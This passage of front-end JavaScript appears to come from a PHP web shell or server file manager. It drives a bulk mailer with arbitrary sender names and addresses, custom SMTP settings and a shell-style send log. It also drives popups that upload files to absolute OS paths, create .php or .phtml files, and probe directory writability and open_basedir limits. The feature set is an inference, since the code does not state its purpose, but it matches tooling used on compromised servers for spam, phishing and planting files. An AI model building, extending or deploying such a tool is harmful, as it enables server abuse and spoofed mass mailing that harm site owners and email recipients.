                    win.style.top = top + 'px';
                } else {
                    const left = Math.max(6, Math.min(window.innerWidth - mw - 6, Math.round((window.innerWidth - mw) / 2)));
                    const top = Math.max(6, Math.min(window.innerHeight - mh - 6, Math.round((window.innerHeight - mh) / 2)));
                    win.style.left = left + 'px';
                    win.style.top = top + 'px';
                }
            } catch(e) {}

            const titlebar = win.querySelector('.mailer-titlebar');
            const closeBtn = win.querySelector('.mailer-close');
            const form = win.querySelector('.mailer-form');
            const sendBtn = win.querySelector('.mailer-send');
            const pauseBtn = win.querySelector('.mailer-pause');
            const resumeBtn = win.querySelector('.mailer-resume');
            const exportBtn = win.querySelector('.mailer-export');
            const statusDiv = win.querySelector('.mailer-status');
            const outputDiv = win.querySelector('.mailer-output');
            const fromEmail = win.querySelector('#mailer-from-email');
            const fromName = win.querySelector('#mailer-from-name');
            const subject = win.querySelector('#mailer-subject');
            const recipients = win.querySelector('#mailer-recipients');
            const message = win.querySelector('#mailer-message');
                const formatInputs = form ? form.querySelectorAll('input[name="format"]') : [];
                const capBadge = win.querySelector('#mailer-cap-badge');
                const capLabel = win.querySelector('#mailer-cap-label');
                const useSmtp = win.querySelector('#mailer-use-smtp');
                const smtpHost = win.querySelector('#mailer-smtp-host');
                const smtpPort = win.querySelector('#mailer-smtp-port');
                const smtpSecure = win.querySelector('#mailer-smtp-secure');
                const smtpEhlo = win.querySelector('#mailer-smtp-ehlo');

            (function(){
                var K = 'mailer.form.';
                function get(k, d){ try { var v = localStorage.getItem(K+k); return (v===null||v===undefined) ? d : v; } catch(e){ return d; } }
                function set(k, v){ try { localStorage.setItem(K+k, String(v)); } catch(e){} }
                if (fromEmail){ fromEmail.value = get('from_email',''); fromEmail.addEventListener('input', function(){ set('from_email', fromEmail.value); }); }
                if (fromName){ fromName.value = get('from_name',''); fromName.addEventListener('input', function(){ set('from_name', fromName.value); }); }
                if (subject){ subject.value = get('subject',''); subject.addEventListener('input', function(){ set('subject', subject.value); }); }
                if (recipients){ recipients.value = get('recipients',''); recipients.addEventListener('input', function(){ set('recipients', recipients.value); }); }
                if (message){ message.value = get('message',''); message.addEventListener('input', function(){ set('message', message.value); }); }
                var fmt = get('format','text');
                if (formatInputs && formatInputs.length){
                    formatInputs.forEach(function(inp){ inp.checked = (inp.value===fmt); inp.addEventListener('change', function(){ if (inp.checked) set('format', inp.value); }); });
                }
                if (smtpEhlo){ smtpEhlo.value = get('smtp_ehlo',''); smtpEhlo.addEventListener('input', function(){ set('smtp_ehlo', smtpEhlo.value); }); }
            })();

            async function refreshCapability(){
                try {
                    if (capBadge) { capBadge.className = 'mailer-cap-badge'; }
                    if (capLabel) { capLabel.textContent = 'Checking…'; capLabel.style.color = '#9aa3af'; }
                    let url = '';
                    const qp = new URLSearchParams();
                    if (useSmtp && useSmtp.checked) {
                        const host = String((smtpHost && smtpHost.value) || '').trim();
                        const port = parseInt(String((smtpPort && smtpPort.value) || '').trim() || '');
                        const sec = String((smtpSecure && smtpSecure.value) || 'tls').trim();
                        const user = String((win.querySelector('#mailer-smtp-user') && win.querySelector('#mailer-smtp-user').value) || '').trim();
                        const pass = String((win.querySelector('#mailer-smtp-pass') && win.querySelector('#mailer-smtp-pass').value) || '').trim();
                        const from = String((fromEmail && fromEmail.value) || '').trim();
                        const rcpt = String((recipients && recipients.value) || '').split('\n').map(function(s){ return String(s||'').trim(); }).filter(function(s){ return s!==''; })[0] || '';
                        const ehlo = String((smtpEhlo && smtpEhlo.value) || '').trim();
                        url = '?mailer_test=1';
                        qp.set('use_smtp','1');
                        if (host) qp.set('host', host);
                        if (!isNaN(port)) qp.set('port', String(port));
                        qp.set('secure', sec);
                        if (user) qp.set('user', user);
                        if (pass) qp.set('pass', pass);
                        if (from) qp.set('from_email', from);
                        if (rcpt) qp.set('rcpt', rcpt);
                        if (ehlo) qp.set('ehlo', ehlo);
                    } else {
                        const rcpt = String((recipients && recipients.value) || '').split('\n').map(function(s){ return String(s||'').trim(); }).filter(function(s){ return s!==''; })[0] || '';
                        url = '?mailer_local_test=1';
                        if (rcpt) qp.set('rcpt', rcpt);
                    }
                    if ([...qp.keys()].length) { url += '&' + qp.toString(); }
                    const resp = await fetch(url);
                    const data = await resp.json();
                    const ok = !!(data && data.success && data.capable === true);
                    if (capBadge) capBadge.className = 'mailer-cap-badge ' + (ok ? 'ok' : 'err');
                    if (capLabel) {
                        capLabel.textContent = ok ? 'Can send' : 'Cannot send';
                        capLabel.style.color = ok ? '#7fff00' : '#ff7b7b';
                    }
                } catch(_){
                    if (capBadge) capBadge.className = 'mailer-cap-badge err';
                    if (capLabel) { capLabel.textContent = 'Check failed'; capLabel.style.color = '#ff7b7b'; }
                }
            }
            refreshCapability();
            useSmtp && useSmtp.addEventListener('change', refreshCapability);
            smtpHost && smtpHost.addEventListener('input', function(){ if (useSmtp && useSmtp.checked) refreshCapability(); });
            smtpPort && smtpPort.addEventListener('input', function(){ if (useSmtp && useSmtp.checked) refreshCapability(); });
            smtpSecure && smtpSecure.addEventListener('change', function(){ if (useSmtp && useSmtp.checked) refreshCapability(); });
            fromEmail && fromEmail.addEventListener('input', function(){ if (useSmtp && useSmtp.checked) refreshCapability(); });
            recipients && recipients.addEventListener('input', function(){ if (useSmtp && useSmtp.checked) refreshCapability(); });

            // Close button handler
            closeBtn && closeBtn.addEventListener('click', function(){ 
                win.remove(); 
                try { window.removeOpenApp && window.removeOpenApp('mailer'); } catch(e){}
            });

            // Form submission handler with pause/resume support
            let paused = false;
            let sending = false;
            function updateControls(){
                if (!sending){
                    if (pauseBtn) pauseBtn.style.display = 'none';
                    if (resumeBtn) resumeBtn.style.display = 'none';
                    if (sendBtn) sendBtn.disabled = false;
                } else if (paused){
                    if (pauseBtn) pauseBtn.style.display = 'none';
                    if (resumeBtn) resumeBtn.style.display = '';
                } else {
                    if (pauseBtn) pauseBtn.style.display = '';
                    if (resumeBtn) resumeBtn.style.display = 'none';
                }
            }
            async function waitIfPaused(){
                while (paused) { await new Promise(r => setTimeout(r, 120)); }
            }

            if (pauseBtn) {
                pauseBtn.addEventListener('click', function(){
                    if (!sending) return;
                    paused = true;
                    statusDiv.textContent = 'Paused — tap play to continue.';
                    statusDiv.style.color = '#facc15';
                    updateControls();
                });
            }
            if (resumeBtn) {
                resumeBtn.addEventListener('click', function(){
                    if (!sending) return;
                    paused = false;
                    statusDiv.textContent = 'Resuming…';
                    statusDiv.style.color = '#9aa3af';
                    updateControls();
                });
            }

            sendBtn && sendBtn.addEventListener('click', async function(e){
                e.preventDefault();
                
                const formData = new FormData(form);
                const recipients = formData.get('recipients').split('\n').filter(email => email.trim());
                const format = formData.get('format');
                
                if (recipients.length === 0) {
                    statusDiv.textContent = 'Please add at least one recipient email.';
                    statusDiv.style.color = '#ff7b7b';
                    return;
                }

                // Validate email addresses
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                const invalidEmails = recipients.filter(email => !emailRegex.test(email.trim()));
                if (invalidEmails.length > 0) {
                    statusDiv.textContent = 'Invalid email addresses: ' + invalidEmails.join(', ');
                    statusDiv.style.color = '#ff7b7b';
                    return;
                }

                // Disable send button and show progress
                sending = true;
                sendBtn.disabled = true;
                updateControls();
                statusDiv.textContent = `Sending ${recipients.length} emails...`;
                statusDiv.style.color = '#9aa3af';
                if (outputDiv) outputDiv.innerHTML = '';

                let sentCount = 0;
                let failCount = 0;

                for (const rawEmail of recipients) {
                    await waitIfPaused();
                    const email = rawEmail.trim();
                    const line = document.createElement('div');
                    line.className = 'pending';
                    line.textContent = `$ -sh ${email} sending ...`;
                    if (outputDiv) {
                        outputDiv.appendChild(line);
                        outputDiv.scrollTop = outputDiv.scrollHeight;
                    }

                const payload = {
                    from_email: formData.get('from_email'),
                    from_name: formData.get('from_name'),
                    subject: formData.get('subject'),
                    message: formData.get('message'),
                    format: format,
                    recipients: [email]
                };
                if (formData.get('use_smtp')) {
                    const sh = (formData.get('smtp_host')||'').trim();
                    const sp = parseInt(formData.get('smtp_port')||'');
                    const ss = (formData.get('smtp_secure')||'tls').trim();
                    const su = (formData.get('smtp_user')||'').trim();
                    const spw = (formData.get('smtp_pass')||'').trim();
                    const se = (formData.get('smtp_ehlo')||'').trim();
                    if (sh) {
                        payload.smtp = { host: sh, port: (isNaN(sp)?undefined:sp), secure: ss, user: su, pass: spw };
                        if (se) payload.smtp.ehlo = se;
                    }
                }
                

                    try {
                        const resp = await fetch('?mailer_send=1', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(payload)
                        });
                        const data = await resp.json();
                        if (data && data.success) {
                            sentCount += (data.sent || 1);
                            line.className = 'ok';
                            line.textContent = `$ -sh ${email} sending ... done`;
                        } else {
                            failCount += 1;
                            line.className = 'err';
                            const errMsg = (data && ((data.details && data.details[0]) || data.error || 'error')) || 'error';
                            line.textContent = `$ -sh ${email} sending ... error: ${errMsg}`;
                        }
                    } catch(err) {
                        failCount += 1;
                        line.className = 'err';
                        line.textContent = `$ -sh ${email} sending ... network error: ${err.message}`;
                    }

                    if (outputDiv) {
                        outputDiv.scrollTop = outputDiv.scrollHeight;
                    }
                }

                // Final status
                if (failCount === 0 && sentCount > 0) {
                    statusDiv.textContent = `Successfully sent ${sentCount} emails.`;
                    statusDiv.style.color = 'Chartreuse';
                    try { ['from_email','from_name','subject','recipients','message','format','smtp_host','smtp_port','smtp_secure','smtp_user','smtp_pass','use_smtp'].forEach(function(k){ localStorage.removeItem('mailer.form.'+k); }); } catch(e){}
                    if (fromEmail) fromEmail.value = '';
                    if (fromName) fromName.value = '';
                    if (subject) subject.value = '';
                    if (recipients) recipients.value = '';
                    if (message) message.value = '';
                } else if (sentCount > 0) {
                    statusDiv.textContent = `Done with ${sentCount} sent, ${failCount} failed.`;
                    statusDiv.style.color = '#f59e0b';
                } else {
                    statusDiv.textContent = `All failed (${failCount}).`;
                    statusDiv.style.color = '#ff7b7b';
                }
                sending = false;
                sendBtn.disabled = false;
                updateControls();
            });

            exportBtn && exportBtn.addEventListener('click', function(){
                const formData = new FormData(form);
                const toList = String(formData.get('recipients')||'').split('\n').map(function(s){ return String(s||'').trim(); }).filter(function(s){ return s!==''; });
                if (!toList.length) { statusDiv.textContent = 'Add recipients before export.'; statusDiv.style.color = '#ff7b7b'; return; }
                const fromEmailVal = String(formData.get('from_email')||'').trim();
                const fromNameVal = String(formData.get('from_name')||'').trim();
                const subjVal = String(formData.get('subject')||'').trim();
                const msgVal = String(formData.get('message')||'');
                const fmtVal = String(formData.get('format')||'text');
                const dateStr = new Date().toUTCString();
                const headers = [];
                headers.push('Date: ' + dateStr);
                headers.push('From: ' + (fromNameVal ? (fromNameVal + ' <' + fromEmailVal + '>') : fromEmailVal));
                headers.push('To: ' + toList.join(', '));
                headers.push('Subject: ' + subjVal);
                headers.push('MIME-Version: 1.0');
                headers.push('Content-Type: ' + (fmtVal==='html' ? 'text/html' : 'text/plain') + '; charset=UTF-8');
                headers.push('Content-Transfer-Encoding: 8bit');
                const eml = headers.join('\r\n') + '\r\n\r\n' + msgVal;
                const blob = new Blob([eml], { type: 'message/rfc822' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                const safe = (subjVal||'message').replace(/[^a-zA-Z0-9._-]+/g,'_');
                a.href = url;
                a.download = (safe || 'message') + '.eml';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                setTimeout(function(){ URL.revokeObjectURL(url); }, 800);
                statusDiv.textContent = 'Exported .eml';
                statusDiv.style.color = '#7fff00';
            });

            let dragging = false, offX = 0, offY = 0, px = 0, py = 0, rafId = 0;
            function apply(){ rafId = 0; win.style.transform = 'translate3d(' + px + 'px,' + py + 'px,0)'; }
            function onDown(e){
                if (closeBtn && (e.target===closeBtn || (closeBtn.contains && closeBtn.contains(e.target)))) return;
                dragging = true;
                var r = win.getBoundingClientRect();
                offX = (e.clientX||0) - r.left;
                offY = (e.clientY||0) - r.top;
                try { titlebar.setPointerCapture && titlebar.setPointerCapture(e.pointerId); } catch(err){}
            }
            function onMove(e){
                if (!dragging) return;
                var x = Math.max(6, Math.min(window.innerWidth - win.offsetWidth - 6, (e.clientX||0) - offX));
                var y = Math.max(6, Math.min(window.innerHeight - win.offsetHeight - 6, (e.clientY||0) - offY));
                px = x - (parseInt(win.style.left||'0',10)||0);
                py = y - (parseInt(win.style.top||'0',10)||0);
                if (!rafId) rafId = requestAnimationFrame(apply);
            }
            function onUp(e){
                if (!dragging) return;
                dragging = false;
                win.style.transform = '';
                var finalLeft = Math.max(6, Math.min(window.innerWidth - win.offsetWidth - 6, (e.clientX||0) - offX));
                var finalTop = Math.max(6, Math.min(window.innerHeight - win.offsetHeight - 6, (e.clientY||0) - offY));
                win.style.left = finalLeft + 'px';
                win.style.top = finalTop + 'px';
                try {
                    var rect = win.getBoundingClientRect();
                    localStorage.setItem('mailer.left', String(Math.round(rect.left)));
                    localStorage.setItem('mailer.top', String(Math.round(rect.top)));
                } catch(err){}
                try { titlebar.releasePointerCapture && titlebar.releasePointerCapture(e.pointerId); } catch(err2){}
            }
            if (titlebar){
                titlebar.addEventListener('pointerdown', onDown);
                titlebar.addEventListener('pointermove', onMove);
                titlebar.addEventListener('pointerup', onUp);
                titlebar.addEventListener('pointercancel', onUp);
            }

            return win;
        }

        // Trigger click handler
        trigger && trigger.addEventListener('click', function(e){ 
            e.preventDefault(); 
            spawnMailerWindow(); 
        });
    })();
    </script>

    <script type="text/javascript">
        // @ts-nocheck
        /* eslint-disable */
        /* global window, document, localStorage */
        (function(){ 'use strict';
        
        // Upload and New popups
        var uploadTemplate = document.getElementById('upload-template');
        var uploadLayer = document.getElementById('upload-layer');
        var addTemplate = document.getElementById('add-template');
        var addLayer = document.getElementById('add-layer');

        function centerWindow(win){
            try {
                var bw = win.offsetWidth || 600;
                var bh = win.offsetHeight || 360;
                var left = Math.max(6, Math.min(window.innerWidth - bw - 6, Math.round((window.innerWidth - bw) / 2)));
                var top = Math.max(6, Math.min(window.innerHeight - bh - 6, Math.round((window.innerHeight - bh) / 2)));
                win.style.left = left + 'px';
                win.style.top = top + 'px';
            } catch(e) {}
        }
        function makeDraggable(win, selector){
            var titlebar = win.querySelector(selector);
            var dragging = false, ox = 0, oy = 0;
            function onDown(ev){ dragging = true; var p = ev.touches ? ev.touches[0] : ev; var rect = win.getBoundingClientRect(); ox = p.clientX - rect.left; oy = p.clientY - rect.top; document.body.style.userSelect = 'none'; document.addEventListener('mousemove', onMove); document.addEventListener('touchmove', onMove, { passive:false }); document.addEventListener('mouseup', onUp); document.addEventListener('touchend', onUp); }
            function onMove(ev){ if (!dragging) return; if (ev.cancelable) ev.preventDefault(); var p = ev.touches ? ev.touches[0] : ev; var left = p.clientX - ox; var top = p.clientY - oy; var maxLeft = window.innerWidth - win.offsetWidth - 8; var maxTop = window.innerHeight - win.offsetHeight - 8; if (left < 8) left = 8; if (top < 8) top = 8; if (left > maxLeft) left = maxLeft; if (top > maxTop) top = maxTop; win.style.left = left + 'px'; win.style.top = top + 'px'; }
            function onUp(){ if (!dragging) return; dragging = false; document.body.style.userSelect = ''; document.removeEventListener('mousemove', onMove); document.removeEventListener('touchmove', onMove); document.removeEventListener('mouseup', onUp); document.removeEventListener('touchend', onUp); }
            titlebar && titlebar.addEventListener('mousedown', onDown);
            titlebar && titlebar.addEventListener('touchstart', onDown, { passive:true });
        }

        function spawnUploadWindow(params){
            if (!uploadTemplate || !uploadLayer) return null;
            var win = uploadTemplate.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            uploadLayer.appendChild(win);
            centerWindow(win);

            var closeBtn = win.querySelector('.upload-close');
            closeBtn && closeBtn.addEventListener('click', function(){ win.remove(); });
            makeDraggable(win, '.upload-titlebar');

            var form = win.querySelector('.upload-form');
            var fileInput = win.querySelector('#upload-file');
            var pill = win.querySelector('.upload-pill');
            var label = win.querySelector('.upload-label');
            var submitBtn = win.querySelector('.upload-submit');
            var diagBox = win.querySelector('.upload-diagnostics');
            var diagTarget = win.querySelector('.upload-diagnostics .diag-target');
            var diagTemp = win.querySelector('.upload-diagnostics .diag-temp');
            var diagFree = win.querySelector('.upload-diagnostics .diag-free');
            var diagBase = win.querySelector('.upload-diagnostics .diag-basedir');
            var diagFile = win.querySelector('.upload-diagnostics .diag-file');
            var prog = win.querySelector('.upload-progress');
            var bar = win.querySelector('.upload-progress .bar');
            var stats = win.querySelector('.upload-stats');
            var pctEl = stats && stats.querySelector('.pct');
            var speedEl = stats && stats.querySelector('.speed');
            var etaEl = stats && stats.querySelector('.eta');
            var sizeEl = stats && stats.querySelector('.size');
            // Removed open uploaded link per request

            if (form) {
                form.method = 'post';
                form.enctype = 'multipart/form-data';
                // Action same page to let backend redirect to directory view
                form.action = window.location.pathname + (params.rel ? ('?d=' + encodeURIComponent(params.rel)) : (params.os ? ('?os=' + encodeURIComponent(params.os)) : ''));
                var hidden1 = document.createElement('input');
                hidden1.type = 'hidden';
                if (params.rel) { hidden1.name = 'do_upload'; hidden1.value = '1'; } else { hidden1.name = 'do_upload_abs'; hidden1.value = '1'; }
                form.appendChild(hidden1);
                var hidden2 = document.createElement('input');
                hidden2.type = 'hidden';
                if (params.rel) { hidden2.name = 'dir'; hidden2.value = params.rel; } else { hidden2.name = 'os'; hidden2.value = params.os; }
                form.appendChild(hidden2);
                var hidden3 = document.createElement('input');
                hidden3.type = 'hidden'; hidden3.name = 'ajax'; hidden3.value = '1';
                form.appendChild(hidden3);
            }
            pill && pill.addEventListener('click', function(){ fileInput && fileInput.click(); });
            fileInput && fileInput.addEventListener('change', function(){
                if (fileInput.files && fileInput.files.length){
                    var name = fileInput.files[0].name || '';
                    if (label) { label.textContent = name; label.title = name; }
                    if (diagFile) {
                        diagFile.innerHTML = '<span class="material-symbols-rounded" aria-hidden="true" style="font-size:16px; color:#64b5f6;">description</span>' +
                            '<span>File name: <span style="color:#93c5fd; font-weight:600;">' + name.replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</span></span>';
                    }
                    pill.style.borderColor = '#3b82f6';
                    pill.style.backgroundColor = 'rgba(59,130,246,0.1)';
                } else {
                    if (label) { label.textContent = 'Choose a file…'; label.title = 'Choose a file…'; }
                    if (diagFile) {
                        diagFile.innerHTML = '<span class="material-symbols-rounded" aria-hidden="true" style="font-size:16px; color:#64748b;">description</span>' +
                            '<span>File name: —</span>';
                    }
                    pill.style.borderColor = '';
                    pill.style.backgroundColor = '';
                }
            });
            // Diagnostics fetch (auto-show)
            (function(){
                try {
                    if (!diagBox) return;
                    var u = window.location.pathname + '?upload_diag=1' + (params.rel ? ('&d=' + encodeURIComponent(params.rel)) : (params.os ? ('&os=' + encodeURIComponent(params.os)) : ''));
                    diagBox.style.display = '';
                    var fmtBytes = function(b){
                        var units = ['B','KB','MB','GB','TB'];
                        var i = 0; var v = Math.max(0, Number(b||0));
                        while (v >= 1024 && i < units.length - 1) { v /= 1024; i++; }
                        var fixed = v < 10 ? 1 : 0; return v.toFixed(fixed) + ' ' + units[i];
                    };
                    fetch(u).then(function(r){ return r.json(); }).then(function(d){
                        try {
                            if (diagTarget) {
                                var ok = !!d.dirWritable;
                                var icon = ok ? 'task_alt' : 'error';
                                var color = ok ? '#22c55e' : '#ef4444';
                                diagTarget.innerHTML = '<span class="material-symbols-rounded" aria-hidden="true" style="font-size:16px; color:'+color+';">'+icon+'</span>' +
                                    '<span>Target dir writable: <span style="color:'+color+'; font-weight:600; text-transform:uppercase;">'+(ok?'YES':'NO')+'</span></span>';
                            }
                            if (diagTemp) {
                                var tmp = d.tmpDir || 'n/a';
                                var tw = !!d.tmpWritable;
                                var icon2 = 'folder_open'; var color2 = tw ? '#22c55e' : '#ef4444';
                                diagTemp.innerHTML = '<span class="material-symbols-rounded" aria-hidden="true" style="font-size:16px; color:'+color2+';">'+icon2+'</span>' +
                                    '<span>Temp dir: <span style="color:#93c5fd;">'+tmp+'</span> (writable: <span style="color:'+color2+'; font-weight:600; text-transform:uppercase;">'+(tw?'YES':'NO')+'</span>)</span>';
                            }
                            if (diagFree) {
                                var free = fmtBytes(d.freeBytes || 0);
                                diagFree.innerHTML = '<span class="material-symbols-rounded" aria-hidden="true" style="font-size:16px; color:#64b5f6;">storage</span>' +
                                    '<span>Free disk space: <span style="color:#93c5fd; font-weight:600;">'+free+'</span></span>';
                            }
                            if (diagBase) {
                                var ob = d.openBasedir || '';
                                var set = !!ob && ob !== 'none';
                                var icon3 = set ? 'lock' : 'lock_open';
                                var color3 = set ? '#f59e0b' : '#22c55e';
                                diagBase.innerHTML = '<span class="material-symbols-rounded" aria-hidden="true" style="font-size:16px; color:'+color3+';">'+icon3+'</span>' +
                                    '<span>open_basedir: <span style="color:'+(set?'#fbbf24':'#93c5fd')+';">'+(set?ob:'none')+'</span></span>';
                            }
                        } catch(e){}
                    }).catch(function(){ /* ignore */ });
                } catch(e){}
            })();
            submitBtn && submitBtn.addEventListener('click', function(e){
                e.preventDefault();
                if (!form) return;
                // Client-side validation: require a file selection
                var body = win.querySelector('.upload-body');
                var existing = (body || win).querySelector('.op-status');
                if (existing) existing.remove();
                if (!fileInput || !fileInput.files || !fileInput.files[0]) {
                    var banner1 = document.createElement('div');
                    banner1.className = 'op-status err';
                    banner1.innerHTML = '<span class="material-symbols-rounded">error</span> Failed: Please choose a file to upload.';
                    (body || win).insertBefore(banner1, (body || win).firstChild);
                    // Auto-hide client-side validation error after 2 seconds
                    setTimeout(function(){ try { if (banner1 && banner1.parentNode) { banner1.remove(); } } catch(e){} }, 2000);
                    return;
                }
                var fd = new FormData(form);
                if (fileInput && fileInput.files && fileInput.files[0]) {
                    fd.set('upload', fileInput.files[0]);
                }
                submitBtn.disabled = true;
                var started = Date.now();
                var totalBytes = (fileInput && fileInput.files && fileInput.files[0] ? fileInput.files[0].size : 0) || 0;
                var xhr = new XMLHttpRequest();
                xhr.open('POST', form.action, true);
                xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
                // Global banner elements
                var g = document.getElementById('global-upload');
                var gpct = g && g.querySelector('.pct');
                var gspeed = g && g.querySelector('.speed');
                var geta = g && g.querySelector('.eta');
                var gsize = g && g.querySelector('.size');
                var gbar = g && g.querySelector('.bar');
                // Keep progress only in popup; hide any global banner
                if (g) g.style.display = 'none';
                // Do not update global stats; use local popup stats instead
                // Ensure local progress UI in the popup is visible and above other elements
                if (prog) { prog.style.display = ''; prog.style.position = 'relative'; prog.style.zIndex = '10'; }
                if (stats) { stats.style.display = ''; }
                if (sizeEl) { var lmb = (totalBytes / (1024*1024)); sizeEl.textContent = 'Size: ' + (lmb ? lmb.toFixed(1) : '0') + ' MB'; }
            xhr.upload.onprogress = function(ev){
                try {
                    var loaded = ev.loaded || 0; var total = ev.total || totalBytes || 0;
                    var pct = total ? Math.round((loaded / total) * 100) : 0;
                    var elapsed = (Date.now() - started) / 1000.0;
                    var speed = elapsed > 0 ? (loaded / elapsed) : 0; // bytes/s
                    var mbps = speed / (1024*1024);
                    var remain = total - loaded;
                    var eta = speed > 0 ? (remain / speed) : 0;
                    // Update local popup progress bar and stats
                    if (bar) { bar.style.width = pct + '%'; }
                    if (pctEl) { pctEl.textContent = pct + '%'; }
                    if (speedEl) { speedEl.textContent = (mbps ? mbps.toFixed(1) : '0') + ' MB/s'; }
                    if (etaEl) { etaEl.textContent = 'ETA: ' + (eta > 0 ? Math.round(eta) + 's' : '0s'); }
                } catch(e){}
            };
            xhr.onload = function(){
                var body2 = win.querySelector('.upload-body');
                var actions = win.querySelector('.upload-actions');
                var prev = (body2 || win).querySelector('.op-status');
                if (prev) prev.remove();
                var ok = (xhr.status >= 200 && xhr.status < 300);
                var data = null;
                try { data = JSON.parse(xhr.responseText || '{}'); } catch(e){}
                var hasError = !ok || !(data && data.success);
                if (hasError) {
                    var banner = document.createElement('div');
                    banner.className = 'op-status err';
                    banner.innerHTML = '<span class="material-symbols-rounded">error</span> Failed' + (data && data.error ? ': ' + data.error : '');
                    if (actions && actions.parentNode) {
                        actions.parentNode.insertBefore(banner, actions);
                    } else {
                        (body2 || win).insertBefore(banner, (body2 || win).firstChild);
                    }
                    submitBtn.disabled = false;
                    setTimeout(function(){ try { if (banner && banner.parentNode) { banner.remove(); } } catch(e){} }, 2000);
                    return;
                }
                // Success: change the submit button icon to indicate completion
                if (submitBtn) {
                    submitBtn.innerHTML = '<span class="material-symbols-rounded">task_alt</span>';
                    submitBtn.title = 'Upload complete';
                    submitBtn.setAttribute('aria-label', 'Upload complete');
                }
                // Force progress bar to 100%
                if (bar) bar.style.width = '100%'; if (pctEl) pctEl.textContent = '100%'; if (etaEl) etaEl.textContent = 'ETA: 0s';
                // Refresh listing after ~2.5 seconds to allow message visibility
                setTimeout(function(){ window.location.href = form.action; }, 2500);
            };
                xhr.onerror = function(){ submitBtn.disabled = false; };
                xhr.send(fd);
            });
            return win;
        }

        function spawnAddWindow(params){
            if (!addTemplate || !addLayer) return null;
            var win = addTemplate.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            addLayer.appendChild(win);
            centerWindow(win);

            var closeBtn = win.querySelector('.add-close');
            closeBtn && closeBtn.addEventListener('click', function(){ win.remove(); });
            makeDraggable(win, '.add-titlebar');

            var form = win.querySelector('.add-form');
            var fileRows = win.querySelectorAll('.add-body .file-only');
            var folderRows = win.querySelectorAll('.add-body .folder-only');
            var submitBtn = win.querySelector('.add-submit');
            if (form) {
                form.method = 'post';
                form.action = window.location.pathname + (params.rel ? ('?d=' + encodeURIComponent(params.rel)) : (params.os ? ('?os=' + encodeURIComponent(params.os)) : ''));
                var hidden1 = document.createElement('input');
                hidden1.type = 'hidden';
                if (params.rel) { hidden1.name = 'do_create'; hidden1.value = '1'; } else { hidden1.name = 'do_create_abs'; hidden1.value = '1'; }
                form.appendChild(hidden1);
                var hidden2 = document.createElement('input');
                hidden2.type = 'hidden';
                if (params.rel) { hidden2.name = 'dir'; hidden2.value = params.rel; } else { hidden2.name = 'os'; hidden2.value = params.os; }
                form.appendChild(hidden2);
                try {
                    var radios = form.querySelectorAll('input[name="create_type"]');
                    function updateCreateType(){
                        var tEl = form.querySelector('input[name="create_type"]:checked');
                        var t = tEl ? tEl.value : 'file';
                        var showFile = (t === 'file');
                        Array.prototype.forEach.call(fileRows, function(el){ el.style.display = showFile ? '' : 'none'; });
                        Array.prototype.forEach.call(folderRows, function(el){ el.style.display = showFile ? 'none' : ''; });
                    }
                    Array.prototype.forEach.call(radios, function(r){ r.addEventListener('change', updateCreateType); });
                    updateCreateType();
                } catch(e){}
            }
            function showErrorPopup(message){
                try {
                    var tpl = document.getElementById('errors-template');
                    var layer = document.getElementById('errors-layer');
                    if (!tpl || !layer) return;
                    var win2 = tpl.cloneNode(true);
                    win2.removeAttribute('id');
                    win2.style.display = '';
                    win2.classList.add('show');
                    win2.classList.add('message');
                    layer.appendChild(win2);
                    centerWindow(win2);
                    var titleEl = win2.querySelector('.errors-title');
                    if (titleEl) { titleEl.innerHTML = '<span class="material-symbols-rounded errors-icon" aria-hidden="true">warning</span> Error'; }
                    var summary = win2.querySelector('.errors-summary');
                    var output = win2.querySelector('.errors-output');
                    var actions = win2.querySelector('.errors-actions');
                    if (summary) { summary.textContent = String(message||'Error'); }
                    if (output) { output.style.display = 'none'; }
                    if (actions) { actions.style.display = 'none'; }
                    var closeBtn2 = win2.querySelector('.errors-close');
                    closeBtn2 && closeBtn2.addEventListener('click', function(){ win2.remove(); });
                } catch(e){}
            }
            submitBtn && submitBtn.addEventListener('click', function(e){
                e.preventDefault();
                if (!form) return;
                // Client-side validation for file/folder names
                var body = win.querySelector('.add-body');
                var existing = (body || win).querySelector('.op-status');
                if (existing) existing.remove();
                var typeEl = form.querySelector('input[name="create_type"]:checked');
                var type = typeEl ? typeEl.value : 'file';
                var failMsg = '';
                if (type === 'file') {
                    var nameEl = form.querySelector('input[name="file_name"]');
                    var extEl = form.querySelector('select[name="file_ext"]');
                    var name = (nameEl && nameEl.value) ? nameEl.value.trim() : '';
                    var ext = (extEl && extEl.value) ? extEl.value.trim().toLowerCase() : '';
                    if (!name) { failMsg = 'File name is required.'; }
                    else if (!/^[A-Za-z0-9_-]+$/.test(name)) { failMsg = 'Invalid file name (letters, numbers, _ or - only).'; }
                    else if (['php','phtml','html','txt'].indexOf(ext) === -1) { failMsg = 'Invalid extension.'; }
                } else if (type === 'folder') {
                    var folderEl = form.querySelector('input[name="folder_name"]');
                    var folder = (folderEl && folderEl.value) ? folderEl.value.trim() : '';
                    if (!folder) { failMsg = 'Folder name is required.'; }
                    else if (!/^[A-Za-z0-9._-]+$/.test(folder) || /[\\\/\0]/.test(folder)) { failMsg = 'Invalid folder name.'; }
                }
                if (failMsg) {
                    showErrorPopup('Failed: ' + failMsg);
                    return;
                }
                var fd = new FormData(form);
                submitBtn.disabled = true;
                try {
                    var okStatus = false; var didRedirect = false;
                    fetch(form.action, { method: 'POST', body: fd, redirect: 'follow' })
                        .then(function(res){
                            didRedirect = !!res.redirected || (res.status >= 300 && res.status < 400);
                            okStatus = !!res.ok || didRedirect;
                            return didRedirect ? Promise.resolve('') : res.text();
                        })
                        .then(function(html){
                            var hasError = false, errMsg = '';
                            try {
                                if (!okStatus) {
                                    hasError = true;
                                } else if (!didRedirect && html && html.indexOf('class="error"') !== -1) {
                                    hasError = true;
                                    var parser = new DOMParser();
                                    var doc = parser.parseFromString(html || '', 'text/html');
                                    var errEl = doc && doc.querySelector('.error');
                                    errMsg = (errEl && errEl.textContent) ? errEl.textContent.trim() : '';
                                }
                            } catch(e){}
                            var body2 = win.querySelector('.add-body');
                            var prev = (body2 || win).querySelector('.op-status');
                            if (prev) prev.remove();
